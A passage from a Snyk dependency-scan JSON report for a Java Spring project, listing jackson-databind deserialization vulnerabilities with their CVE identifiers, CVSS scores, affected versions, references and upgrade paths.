Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/f6d9c664f6d481703138319f6a0f1fdbddb3a259)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2765)\n",
      "disclosureTime": "2020-06-14T14:45:09Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.5"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.5)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.5)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572300",
      "identifiers": {
        "CVE": [
          "CVE-2020-14195"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mc6h-4qgp-37qh"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:46.867601Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-14T15:32:14Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/f6d9c664f6d481703138319f6a0f1fdbddb3a259"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2765"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.5)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-06-15T10:29:46.691157Z",
      "credit": [
        "Topsec"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It is possible to conduct a Deserialization attack using the `oadd.org.apache.xalan.lib.sql.JNDIConnectionPool`  (`apache/drill`) class gadget if polymorphic type handling is enabled and an application using this package allows user input which gets deserialized. \r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/d1c67a0396e84c08d0558fbb843b5bd1f26e1921)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2688)\n- [Medium Article](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-06-15T10:23:33Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.5"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572314",
      "identifiers": {
        "CVE": [
          "CVE-2020-14060"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-j823-4qch-3rgm"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:46.779453Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-15T15:46:13Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/d1c67a0396e84c08d0558fbb843b5bd1f26e1921"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2688"
        },
        {
          "title": "Medium Article",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.5)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-06-15T11:03:46.232208Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It is possible to conduct a Deserialization attack using any of the following class gadget available within `weblogic/oracle-aqjms` if polymorphic type handling is enabled and an application using this package allows user input which gets deserialized. \r\n\r\n* oracle.jms.AQjmsQueueConnectionFactory\r\n* oracle.jms.AQjmsXATopicConnectionFactory\r\n* oracle.jms.AQjmsTopicConnectionFactory\r\n* oracle.jms.AQjmsXAQueueConnectionFactory\r\n* oracle.jms.AQjmsXAConnectionFactory\r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.5 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2698)\n- [Medium Article](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-06-15T10:59:39Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.5"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-572316",
      "identifiers": {
        "CVE": [
          "CVE-2020-14061"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-c2q3-4qrh-fm48"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-05-02T13:21:46.536621Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-15T15:45:37Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2698"
        },
        {
          "title": "Medium Article",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.5)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-08-26T11:28:06.617646Z",
      "credit": [
        "Tatu Saloranta"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `br.com.anteros.dbcp.AnterosDBCPDataSource` (aka Anteros-DBCP).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.6 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2814)\n- [Medium Article](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Kamimuka/cve-2020-24616-poc)\n",
      "disclosureTime": "2020-08-26T11:26:14Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.6"
      ],
      "functions": [
        {
          "functionId": {
            "className": "SubTypeValidator",
            "filePath": "com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java",
            "functionName": "validateSubType"
          },
          "version": [
            "[2.9.4,2.9.10.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.jsontype.impl.SubTypeValidator",
            "functionName": "validateSubType"
          },
          "version": [
            "[2.9.4,2.9.10.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664",
      "identifiers": {
        "CVE": [
          "CVE-2020-24616"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-15T15:50:54.814476Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-08-26T14:27:29Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2814"
        },
        {
          "title": "Medium Article",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Kamimuka/cve-2020-24616-poc"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.6)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:11:34.234921Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attack, if the user is handling untrusted content or using the `Default Typing` feature.  an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-12022`) is not identical to `CVE-2018-12018`,`CVE-2018-12019`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14723` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.4, 2.8.11.2, 2.9.6 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/7487cf7eb14be2f65a1eb108e8629c07ef45e0a1)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2052)\n",
      "disclosureTime": "2018-05-29T17:00:04Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.4",
        "2.8.11.2",
        "2.9.6"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0,2.8.11.2)",
            "[2.9.0,2.9.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0,2.8.11.2)",
            "[2.9.0,2.9.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72445",
      "identifiers": {
        "CVE": [
          "CVE-2018-12022"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-cjjf-94ff-43w7",
          "GHSA-wrr7-33fx-rcvj"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-07-06T14:09:22.020113Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:00:03Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/7487cf7eb14be2f65a1eb108e8629c07ef45e0a1"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2052"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.4)",
          "[2.8.0,2.8.11.2)",
          "[2.9.0,2.9.6)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.14.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:14:00.916831Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It may allow content exfiltration (remote access by sending contents over ftp) when untrusted content is deserialized with default typing enabled. This vulnerability is due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-11307`) is not identical to `CVE-2018-12018`,`CVE-2018-12019`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14722` and `CVE-2018-14723`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.4, 2.8.11.2, 2.9.5 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/27b4defc270454dea6842bd9279f17387eceb737)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2032)\n",
      "disclosureTime": "2018-05-10T17:10:58Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.4",
        "2.8.11.2",
        "2.9.5"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0, 2.8.11.2)",
            "[2.9.0, 2.9.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0, 2.8.11.2)",
            "[2.9.0, 2.9.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72446",
      "identifiers": {
        "CVE": [
          "CVE-2018-11307"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-qr7j-h6gg-jmgc"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-04-28T12:11:41.740420Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:10:50Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/27b4defc270454dea6842bd9279f17387eceb737"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2032"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.4)",
          "[2.8.0,2.8.11.2)",
          "[2.9.0,2.9.5)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.14.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
